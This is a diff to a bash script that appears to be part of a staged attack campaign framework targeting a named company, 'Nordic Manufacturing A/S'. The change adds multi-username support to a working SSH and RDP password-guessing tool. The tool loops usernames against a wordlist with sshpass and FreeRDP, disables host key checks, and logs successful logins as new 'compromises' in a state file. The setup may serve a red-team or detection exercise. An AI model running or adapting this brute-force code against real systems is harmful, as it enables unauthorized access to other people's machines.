@@ -2,24 +2,27 @@
 
 set -u
 
-
 # ============================================================
 # Nordic Manufacturing A/S
-# H3 Incident Campaign V2
+# H3 Incident Campaign V2.2
 #
-# PHASE 08 - WORDLIST AUTHENTICATION
+# PHASE 08 - MULTI-USER WORDLIST AUTHENTICATION
 #
 # Purpose:
 #
 #   Run password guessing ONLY against discovered SSH/RDP
 #   targets that were NOT compromised during Phase 03.
 #
-# Important:
+# Behaviour:
 #
 #   - Existing compromised hosts are skipped.
+#   - Multiple usernames are supported.
+#   - Password wordlist is standard one-password-per-line format.
+#   - Each username is tested against the password wordlist.
+#   - Testing stops on first successful credential per host.
 #   - Passwords are NEVER written to logs/state.
 #   - Wordlist contents are NEVER written to logs/state.
-#   - Testing stops on first successful credential per host.
+#   - Successful username and attempt count may be recorded.
 #   - Successful hosts are merged into compromised-hosts.json.
 #
 # ============================================================
@@ -32,9 +35,7 @@ set -u
 BASE_DIR="/opt/nordic-attack"
 
 CONFIG_FILE="$BASE_DIR/config/defaults.conf"
-
 STATE_DIR="$BASE_DIR/state"
-
 LOG_DIR="$BASE_DIR/logs"
 
 
@@ -43,14 +44,10 @@ LOG_DIR="$BASE_DIR/logs"
 # ============================================================
 
 if [[ ! -f "$CONFIG_FILE" ]]; then
-
     echo "[ERROR] Configuration file not found:"
     echo "        $CONFIG_FILE"
-
     exit 1
-
 fi
-
 
 # shellcheck source=/dev/null
 source "$CONFIG_FILE"
@@ -58,38 +55,27 @@ source "$CONFIG_FILE"
 
 INCIDENT_ID="${NORDIC_INCIDENT_ID:-H3-UNKNOWN}"
 
-
 DISCOVERED_STATE="${NORDIC_DISCOVERED_STATE:-$STATE_DIR/discovered-hosts.json}"
-
 COMPROMISED_STATE="${NORDIC_COMPROMISED_STATE:-$STATE_DIR/compromised-hosts.json}"
-
 WORDLIST_STATE="$STATE_DIR/wordlist-results.json"
 
-
 WORDLIST_ENABLED="${NORDIC_WORDLIST_ENABLED:-0}"
-
 WORDLIST_FILE="${NORDIC_WORDLIST_FILE:-}"
 
-
 SSH_USERNAME="${NORDIC_SSH_USERNAME:-${NORDIC_SSH_USER:-${NORDIC_DEFAULT_SSH_USER:-ubuntu}}}"
-
-SSH_PORT="${NORDIC_SSH_PORT:-${NORDIC_DEFAULT_SSH_PORT:-22}}"
-
-SSH_TIMEOUT="${NORDIC_SSH_TIMEOUT:-5}"
-
-
 RDP_USERNAME="${NORDIC_RDP_USERNAME:-${NORDIC_RDP_USER:-${NORDIC_DEFAULT_RDP_USER:-Administrator}}}"
 
+WORDLIST_USERS="${NORDIC_WORDLIST_USERS:-$SSH_USERNAME,$RDP_USERNAME}"
+
+SSH_PORT="${NORDIC_SSH_PORT:-${NORDIC_DEFAULT_SSH_PORT:-22}}"
+SSH_TIMEOUT="${NORDIC_SSH_TIMEOUT:-5}"
+
 RDP_PORT="${NORDIC_RDP_PORT:-${NORDIC_DEFAULT_RDP_PORT:-3389}}"
-
 RDP_TIMEOUT="${NORDIC_RDP_TIMEOUT:-5}"
-
 
 CONNECT_TIMEOUT="${NORDIC_CONNECT_TIMEOUT:-2}"
 
-
 LOG_FILE="$LOG_DIR/${INCIDENT_ID}-08-wordlist.log"
-
 
 mkdir -p "$STATE_DIR" "$LOG_DIR"
 
@@ -137,12 +123,11 @@ echo
 echo "============================================================"
 echo
 echo " NORDIC MANUFACTURING"
-echo " H3 INCIDENT CAMPAIGN V2"
-echo " PHASE 08 - WORDLIST AUTHENTICATION"
+echo " H3 INCIDENT CAMPAIGN V2.2"
+echo " PHASE 08 - MULTI-USER WORDLIST AUTHENTICATION"
 echo
 echo "============================================================"
 echo
-
 
 log "[*] Incident ID: $INCIDENT_ID"
 
@@ -156,7 +141,6 @@ if [[ "$WORDLIST_ENABLED" != "1" ]]; then
     log "[SKIPPED] Wordlist attack is disabled."
 
     exit 0
-
 fi
 
 
@@ -165,7 +149,6 @@ if [[ -z "$WORDLIST_FILE" ]]; then
     log "[ERROR] Wordlist mode enabled but no wordlist file supplied."
 
     exit 1
-
 fi
 
 
@@ -174,7 +157,6 @@ if [[ ! -f "$WORDLIST_FILE" ]]; then
     log "[ERROR] Wordlist file does not exist."
 
     exit 1
-
 fi
 
 
@@ -183,7 +165,14 @@ if [[ ! -r "$WORDLIST_FILE" ]]; then
     log "[ERROR] Wordlist file is not readable."
 
     exit 1
+fi
 
+
+if [[ -z "$WORDLIST_USERS" ]]; then
+
+    log "[ERROR] Wordlist mode enabled but no usernames supplied."
+
+    exit 1
 fi
 
 
@@ -198,15 +187,14 @@ for CMD in python3 timeout sshpass ssh; do
         log "[ERROR] Required command not found: $CMD"
 
         exit 1
-
     fi
 
 done
 
 
-# ------------------------------------------------------------
-# FreeRDP
-# ------------------------------------------------------------
+# ============================================================
+# FREERDP
+# ============================================================
 
 FREERDP=""
 
@@ -231,7 +219,6 @@ if [[ ! -f "$DISCOVERED_STATE" ]]; then
     log "        $DISCOVERED_STATE"
 
     exit 1
-
 fi
 
 
@@ -241,7 +228,6 @@ if [[ ! -f "$COMPROMISED_STATE" ]]; then
     log "        $COMPROMISED_STATE"
 
     exit 1
-
 fi
 
 
@@ -261,47 +247,98 @@ tcp_open() {
 
 
 # ============================================================
-# CREATE TARGET INVENTORY
-#
-# Handles both:
-#
-#   [
-#       {"ip": "..."}
-#   ]
-#
-# and:
-#
-#   {
-#       "hosts": [
-#           {"ip": "..."}
-#       ]
-#   }
-#
-# Existing compromised IP addresses are removed.
+# TEMP FILES
 # ============================================================
 
 TARGET_FILE="$(mktemp)"
-
 SUCCESS_FILE="$(mktemp)"
+USER_FILE="$(mktemp)"
 
 
 cleanup() {
 
-    rm -f "$TARGET_FILE" "$SUCCESS_FILE"
-
+    rm -f \
+        "$TARGET_FILE" \
+        "$SUCCESS_FILE" \
+        "$USER_FILE"
 }
+
 
 trap cleanup EXIT
 
+
+# ============================================================
+# NORMALIZE USERNAME LIST
+#
+# Input example:
+#
+#   ubuntu,admin,student,Administrator
+#
+# Duplicate and empty usernames are removed.
+# ============================================================
+
+python3 - \
+    "$WORDLIST_USERS" \
+    "$USER_FILE" <<'PY'
+
+import sys
+
+raw_users = sys.argv[1]
+output = sys.argv[2]
+
+seen = set()
+users = []
+
+for raw in raw_users.split(","):
+
+    username = raw.strip()
+
+    if not username:
+        continue
+
+    if username in seen:
+        continue
+
+    seen.add(username)
+    users.append(username)
+
+with open(output, "w", encoding="utf-8") as f:
+
+    for username in users:
+        f.write(username + "\n")
+PY
+
+
+USER_COUNT=$(
+
+    grep -cve '^[[:space:]]*$' \
+        "$USER_FILE" \
+        2>/dev/null || true
+)
+
+
+if (( USER_COUNT == 0 )); then
+
+    log "[ERROR] No valid usernames remain after normalization."
+
+    exit 1
+fi
+
+
+# ============================================================
+# CREATE TARGET INVENTORY
+#
+# Existing compromised IP addresses are removed.
+# ============================================================
 
 python3 - \
     "$DISCOVERED_STATE" \
     "$COMPROMISED_STATE" \
     "$TARGET_FILE" <<'PY'
 
+import ipaddress
 import json
 import sys
-import ipaddress
 
 
 discovered_file = sys.argv[1]
@@ -363,7 +400,6 @@ for host in compromised:
 
 targets = []
 
-
 for host in discovered:
 
     if isinstance(host, str):
@@ -423,30 +459,34 @@ with open(
     for ip in targets:
 
         f.write(ip + "\n")
-
 PY
 
 
 TARGET_COUNT=$(
 
-    grep -cve '^[[:space:]]*$' "$TARGET_FILE" 2>/dev/null || true
-
+    grep -cve '^[[:space:]]*$' \
+        "$TARGET_FILE" \
+        2>/dev/null || true
 )
 
 
 WORD_COUNT=$(
 
-    grep -cve '^[[:space:]]*$' "$WORDLIST_FILE" 2>/dev/null || true
-
+    grep -cve '^[[:space:]]*$' \
+        "$WORDLIST_FILE" \
+        2>/dev/null || true
 )
 
 
 echo
+
 log "[*] Wordlist loaded."
+log "[*] Candidate usernames: $USER_COUNT"
 log "[*] Candidate passwords: $WORD_COUNT"
 log "[*] Remaining discovered hosts: $TARGET_COUNT"
 log "[*] SSH target port: $SSH_PORT"
 log "[*] RDP target port: $RDP_PORT"
+
 echo
 
 
@@ -460,15 +500,20 @@ if (( TARGET_COUNT == 0 )); then
 
     python3 - \
         "$WORDLIST_STATE" \
-        "$INCIDENT_ID" <<'PY'
+        "$INCIDENT_ID" \
+        "$USER_COUNT" \
+        "$WORD_COUNT" <<'PY'
 
 import json
 import sys
+
 from datetime import datetime, timezone
 
 
 output = sys.argv[1]
 incident_id = sys.argv[2]
+user_count = int(sys.argv[3])
+word_count = int(sys.argv[4])
 
 
 data = {
@@ -477,15 +522,19 @@ data = {
 
     "phase": "08",
 
-    "type": "wordlist-authentication",
+    "type": "multi-user-wordlist-authentication",
 
     "completed": datetime.now(
         timezone.utc
     ).isoformat(),
 
-    "targets": 0,
+    "remaining_hosts_tested": 0,
 
-    "attempts": 0,
+    "candidate_usernames": user_count,
+
+    "candidate_passwords": word_count,
+
+    "authentication_attempts": 0,
 
     "new_compromises": 0,
 
@@ -496,11 +545,9 @@ data = {
 with open(output, "w", encoding="utf-8") as f:
 
     json.dump(data, f, indent=2)
-
 PY
 
     exit 0
-
 fi
 
 
@@ -511,11 +558,9 @@ fi
 TOTAL_ATTEMPTS=0
 
 SSH_TARGETS=0
-
 RDP_TARGETS=0
 
 SSH_SUCCESSES=0
-
 RDP_SUCCESSES=0
 
 NEW_COMPROMISES=0
@@ -580,116 +625,132 @@ while IFS= read -r TARGET; do
 
 
     # ========================================================
-    # SSH WORDLIST
+    # SSH MULTI-USER WORDLIST
     # ========================================================
 
     if (( SSH_OPEN == 1 )); then
 
-        log "[*] Starting SSH wordlist authentication against $TARGET"
+        log "[*] Starting SSH multi-user wordlist authentication against $TARGET"
 
         SSH_ATTEMPTS=0
 
 
-        while IFS= read -r PASSWORD || [[ -n "$PASSWORD" ]]; do
+        while IFS= read -r USERNAME; do
 
-            # Remove CR from Windows formatted wordlists.
-            PASSWORD="${PASSWORD%$'\r'}"
-
-
-            # Skip empty lines.
-            [[ -z "$PASSWORD" ]] && continue
+            [[ -z "$USERNAME" ]] && continue
 
 
-            SSH_ATTEMPTS=$((SSH_ATTEMPTS + 1))
-
-            TOTAL_ATTEMPTS=$((TOTAL_ATTEMPTS + 1))
-
-
-            SSH_OUTPUT=$(
-
-                timeout "$SSH_TIMEOUT" \
-                    sshpass -p "$PASSWORD" \
-                    ssh \
-                    -o StrictHostKeyChecking=no \
-                    -o UserKnownHostsFile=/dev/null \
-                    -o ConnectTimeout="$SSH_TIMEOUT" \
-                    -o PreferredAuthentications=password \
-                    -o PubkeyAuthentication=no \
-                    -o NumberOfPasswordPrompts=1 \
-                    -p "$SSH_PORT" \
-                    "$SSH_USERNAME@$TARGET" \
-                    'printf "NORDIC_ACCESS_OK\n"; uname -s 2>/dev/null || true; hostname 2>/dev/null || true' \
-                    2>/dev/null
-
-            )
-
-
-            if printf '%s\n' "$SSH_OUTPUT" \
-                | grep -q '^NORDIC_ACCESS_OK$'; then
-
-
-                SSH_SUCCESSES=$((SSH_SUCCESSES + 1))
-
-                NEW_COMPROMISES=$((NEW_COMPROMISES + 1))
-
-                HOST_COMPROMISED=1
-
-
-                OS_NAME=$(
-
-                    printf '%s\n' "$SSH_OUTPUT" \
-                        | sed -n '2p'
-
-                )
-
-
-                HOSTNAME=$(
-
-                    printf '%s\n' "$SSH_OUTPUT" \
-                        | sed -n '3p'
-
-                )
-
-
-                PLATFORM="linux"
-
-
-                case "${OS_NAME,,}" in
-
-                    *windows*|*microsoft*)
-
-                        PLATFORM="windows"
-                        ;;
-
-                esac
-
-
-                log "[SUCCESS][SSH] $TARGET authenticated after $SSH_ATTEMPTS attempts."
-
-                ground_truth \
-                    "WORDLIST_SUCCESS ip=$TARGET service=ssh attempts=$SSH_ATTEMPTS"
-
-
-                printf '%s|%s|ssh|%s|%s|%s|%s|%s\n' \
-                    "$TARGET" \
-                    "$PLATFORM" \
-                    "$SSH_PORT" \
-                    "$SSH_USERNAME" \
-                    "$HOSTNAME" \
-                    "$OS_NAME" \
-                    "$SSH_ATTEMPTS" \
-                    >> "$SUCCESS_FILE"
-
-
-                # Password deliberately disappears here.
-                unset PASSWORD
-
-
+            if (( HOST_COMPROMISED == 1 )); then
                 break
-
             fi
 
-        done < "$WORDLIST_FILE"
+
+            log "[*][SSH] Testing username: $USERNAME"
+
+
+            while IFS= read -r PASSWORD || [[ -n "$PASSWORD" ]]; do
+
+                PASSWORD="${PASSWORD%$'\r'}"
+
+                [[ -z "$PASSWORD" ]] && continue
+
+
+                SSH_ATTEMPTS=$((SSH_ATTEMPTS + 1))
+
+                TOTAL_ATTEMPTS=$((TOTAL_ATTEMPTS + 1))
+
+
+                SSH_OUTPUT=$(
+
+                    timeout "$SSH_TIMEOUT" \
+                        sshpass -p "$PASSWORD" \
+                        ssh \
+                        -o StrictHostKeyChecking=no \
+                        -o UserKnownHostsFile=/dev/null \
+                        -o ConnectTimeout="$SSH_TIMEOUT" \
+                        -o PreferredAuthentications=password \
+                        -o PubkeyAuthentication=no \
+                        -o NumberOfPasswordPrompts=1 \
+                        -p "$SSH_PORT" \
+                        "$USERNAME@$TARGET" \
+                        'printf "NORDIC_ACCESS_OK\n"; uname -s 2>/dev/null || true; hostname 2>/dev/null || true' \
+                        2>/dev/null
+
+                )
+
+
+                if printf '%s\n' "$SSH_OUTPUT" \
+                    | grep -q '^NORDIC_ACCESS_OK$'; then
+
+
+                    SSH_SUCCESSES=$((SSH_SUCCESSES + 1))
+
+                    NEW_COMPROMISES=$((NEW_COMPROMISES + 1))
+
+                    HOST_COMPROMISED=1
+
+
+                    OS_NAME=$(
+
+                        printf '%s\n' "$SSH_OUTPUT" \
+                            | sed -n '2p'
+
+                    )
+
+
+                    HOSTNAME=$(
+
+                        printf '%s\n' "$SSH_OUTPUT" \
+                            | sed -n '3p'
+
+                    )
+
+
+                    PLATFORM="linux"
+
+
+                    case "${OS_NAME,,}" in
+
+                        *windows*|*microsoft*)
+
+                            PLATFORM="windows"
+                            ;;
+
+                    esac
+
+
+                    log "[SUCCESS][SSH] $TARGET username=$USERNAME authenticated on attempt $SSH_ATTEMPTS."
+
+
+                    ground_truth \
+                        "WORDLIST_SUCCESS ip=$TARGET service=ssh username=$USERNAME attempts=$SSH_ATTEMPTS"
+
+
+                    printf '%s|%s|ssh|%s|%s|%s|%s|%s\n' \
+                        "$TARGET" \
+                        "$PLATFORM" \
+                        "$SSH_PORT" \
+                        "$USERNAME" \
+                        "$HOSTNAME" \
+                        "$OS_NAME" \
+                        "$SSH_ATTEMPTS" \
+                        >> "$SUCCESS_FILE"
+
+
+                    unset PASSWORD
+
+                    break
+
+                fi
+
+            done < "$WORDLIST_FILE"
+
+
+            if (( HOST_COMPROMISED == 1 )); then
+                break
+            fi
+
+        done < "$USER_FILE"
 
 
         if (( HOST_COMPROMISED == 0 )); then
@@ -705,11 +766,9 @@ while IFS= read -r TARGET; do
 
 
     # ========================================================
-    # RDP WORDLIST
+    # RDP MULTI-USER WORDLIST
     #
-    # If SSH already compromised the host, do not continue
-    # guessing against RDP. One successful access method is
-    # sufficient to mark the host compromised.
+    # If SSH already compromised the host, RDP is not tested.
     # ========================================================
 
     if (( RDP_OPEN == 1 && HOST_COMPROMISED == 0 )); then
@@ -718,83 +777,94 @@ while IFS= read -r TARGET; do
 
             log "[SKIPPED][RDP] FreeRDP client not installed."
 
-            continue
+        else
 
-        fi
+            log "[*] Starting RDP multi-user wordlist authentication against $TARGET"
 
-
-        log "[*] Starting RDP wordlist authentication against $TARGET"
-
-        RDP_ATTEMPTS=0
+            RDP_ATTEMPTS=0
 
 
-        while IFS= read -r PASSWORD || [[ -n "$PASSWORD" ]]; do
+            while IFS= read -r USERNAME; do
 
-            PASSWORD="${PASSWORD%$'\r'}"
-
-            [[ -z "$PASSWORD" ]] && continue
+                [[ -z "$USERNAME" ]] && continue
 
 
-            RDP_ATTEMPTS=$((RDP_ATTEMPTS + 1))
-
-            TOTAL_ATTEMPTS=$((TOTAL_ATTEMPTS + 1))
-
-
-            set +e
-
-            timeout "$RDP_TIMEOUT" \
-                "$FREERDP" \
-                /v:"$TARGET:$RDP_PORT" \
-                /u:"$RDP_USERNAME" \
-                /p:"$PASSWORD" \
-                /cert:ignore \
-                /auth-only \
-                >/dev/null 2>&1
-
-            RDP_RESULT=$?
-
-            set -e 2>/dev/null || true
+                if (( HOST_COMPROMISED == 1 )); then
+                    break
+                fi
 
 
-            if [[ $RDP_RESULT -eq 0 ]]; then
-
-                RDP_SUCCESSES=$((RDP_SUCCESSES + 1))
-
-                NEW_COMPROMISES=$((NEW_COMPROMISES + 1))
-
-                HOST_COMPROMISED=1
+                log "[*][RDP] Testing username: $USERNAME"
 
 
-                log "[SUCCESS][RDP] $TARGET authenticated after $RDP_ATTEMPTS attempts."
+                while IFS= read -r PASSWORD || [[ -n "$PASSWORD" ]]; do
+
+                    PASSWORD="${PASSWORD%$'\r'}"
+
+                    [[ -z "$PASSWORD" ]] && continue
+
+
+                    RDP_ATTEMPTS=$((RDP_ATTEMPTS + 1))
+
+                    TOTAL_ATTEMPTS=$((TOTAL_ATTEMPTS + 1))
+
+
+                    if timeout "$RDP_TIMEOUT" \
+                        "$FREERDP" \
+                        /v:"$TARGET:$RDP_PORT" \
+                        /u:"$USERNAME" \
+                        /p:"$PASSWORD" \
+                        /cert:ignore \
+                        /auth-only \
+                        >/dev/null 2>&1
+                    then
+
+                        RDP_SUCCESSES=$((RDP_SUCCESSES + 1))
+
+                        NEW_COMPROMISES=$((NEW_COMPROMISES + 1))
+
+                        HOST_COMPROMISED=1
+
+
+                        log "[SUCCESS][RDP] $TARGET username=$USERNAME authenticated on attempt $RDP_ATTEMPTS."
+
+
+                        ground_truth \
+                            "WORDLIST_SUCCESS ip=$TARGET service=rdp username=$USERNAME attempts=$RDP_ATTEMPTS"
+
+
+                        printf '%s|windows|rdp|%s|%s|||%s\n' \
+                            "$TARGET" \
+                            "$RDP_PORT" \
+                            "$USERNAME" \
+                            "$RDP_ATTEMPTS" \
+                            >> "$SUCCESS_FILE"
+
+
+                        unset PASSWORD
+
+                        break
+
+                    fi
+
+                done < "$WORDLIST_FILE"
+
+
+                if (( HOST_COMPROMISED == 1 )); then
+                    break
+                fi
+
+            done < "$USER_FILE"
+
+
+            if (( HOST_COMPROMISED == 0 )); then
+
+                log "[FAILED][RDP] $TARGET authentication failed after $RDP_ATTEMPTS attempts."
 
                 ground_truth \
-                    "WORDLIST_SUCCESS ip=$TARGET service=rdp attempts=$RDP_ATTEMPTS"
-
-
-                printf '%s|windows|rdp|%s|%s|||%s\n' \
-                    "$TARGET" \
-                    "$RDP_PORT" \
-                    "$RDP_USERNAME" \
-                    "$RDP_ATTEMPTS" \
-                    >> "$SUCCESS_FILE"
-
-
-                unset PASSWORD
-
-
-                break
+                    "WORDLIST_FAILED ip=$TARGET service=rdp attempts=$RDP_ATTEMPTS"
 
             fi
-
-        done < "$WORDLIST_FILE"
-
-
-        if (( HOST_COMPROMISED == 0 )); then
-
-            log "[FAILED][RDP] $TARGET authentication failed after $RDP_ATTEMPTS attempts."
-
-            ground_truth \
-                "WORDLIST_FAILED ip=$TARGET service=rdp attempts=$RDP_ATTEMPTS"
 
         fi
 
@@ -820,7 +890,9 @@ python3 - \
     "$WORDLIST_STATE" \
     "$INCIDENT_ID" \
     "$TARGET_COUNT" \
-    "$TOTAL_ATTEMPTS" <<'PY'
+    "$TOTAL_ATTEMPTS" \
+    "$USER_COUNT" \
+    "$WORD_COUNT" <<'PY'
 
 import json
 import sys
@@ -835,6 +907,8 @@ from datetime import datetime, timezone
     incident_id,
     target_count,
     total_attempts,
+    user_count,
+    word_count,
 ) = sys.argv[1:]
 
 
@@ -871,7 +945,6 @@ def extract_hosts(data):
 original = load_json(
     compromised_file
 )
-
 
 existing_hosts = extract_hosts(
     original
@@ -957,11 +1030,17 @@ with open(
             "os": os_name,
 
             "access_methods": {
+
                 access: {
+
                     "authenticated": True,
+
                     "port": int(port),
+
                     "username": username,
+
                     "method": "wordlist",
+
                     "attempts": int(
                         attempts or 0
                     ),
@@ -996,16 +1075,18 @@ with open(
 
 
 # ------------------------------------------------------------
-# Preserve the existing compromised-state container format.
+# Preserve compromised-state container format.
 # ------------------------------------------------------------
 
 if isinstance(original, list):
 
     merged_output = existing_hosts
 
+
 elif isinstance(original, dict):
 
     merged_output = original
+
 
     if isinstance(
         original.get("hosts"),
@@ -1014,6 +1095,7 @@ elif isinstance(original, dict):
 
         merged_output["hosts"] = existing_hosts
 
+
     elif isinstance(
         original.get("compromised_hosts"),
         list
@@ -1021,9 +1103,11 @@ elif isinstance(original, dict):
 
         merged_output["compromised_hosts"] = existing_hosts
 
+
     else:
 
         merged_output["hosts"] = existing_hosts
+
 
 else:
 
@@ -1044,9 +1128,9 @@ with open(
 
 
 # ------------------------------------------------------------
-# Separate Phase 08 result state.
+# Phase 08 result state.
 #
-# No password and no wordlist contents are included.
+# Passwords and wordlist contents are deliberately absent.
 # ------------------------------------------------------------
 
 result = {
@@ -1055,7 +1139,7 @@ result = {
 
     "phase": "08",
 
-    "type": "wordlist-authentication",
+    "type": "multi-user-wordlist-authentication",
 
     "completed": datetime.now(
         timezone.utc
@@ -1063,6 +1147,14 @@ result = {
 
     "remaining_hosts_tested": int(
         target_count
+    ),
+
+    "candidate_usernames": int(
+        user_count
+    ),
+
+    "candidate_passwords": int(
+        word_count
     ),
 
     "authentication_attempts": int(
@@ -1083,6 +1175,14 @@ result = {
 
             "access": host["access"],
 
+            "username": host[
+                "access_methods"
+            ][
+                host["access"]
+            ][
+                "username"
+            ],
+
             "credential_method": "wordlist",
 
             "attempts": host[
@@ -1092,7 +1192,6 @@ result = {
         }
 
         for host in new_hosts
-
     ],
 }
 
@@ -1108,7 +1207,6 @@ with open(
         f,
         indent=2
     )
-
 PY
 
 
@@ -1122,64 +1220,52 @@ echo " PHASE 08 COMPLETED"
 echo "============================================================"
 echo
 
-
 echo "Remaining discovered hosts:"
 echo "  $TARGET_COUNT"
-
 echo
 
+echo "Candidate usernames:"
+echo "  $USER_COUNT"
+echo
+
+echo "Candidate passwords:"
+echo "  $WORD_COUNT"
+echo
 
 echo "SSH targets:"
 echo "  $SSH_TARGETS"
-
 echo
-
 
 echo "RDP targets:"
 echo "  $RDP_TARGETS"
-
 echo
-
 
 echo "Authentication attempts:"
 echo "  $TOTAL_ATTEMPTS"
-
 echo
-
 
 echo "New compromises:"
 echo "  $NEW_COMPROMISES"
-
 echo
-
 
 echo "SSH compromises:"
 echo "  $SSH_SUCCESSES"
-
 echo
-
 
 echo "RDP compromises:"
 echo "  $RDP_SUCCESSES"
-
 echo
-
 
 echo "Wordlist result state:"
 echo "  $WORDLIST_STATE"
-
 echo
-
 
 echo "Updated compromised hosts:"
 echo "  $COMPROMISED_STATE"
-
 echo
-
 
 echo "Log:"
 echo "  $LOG_FILE"
-
 echo
 
 
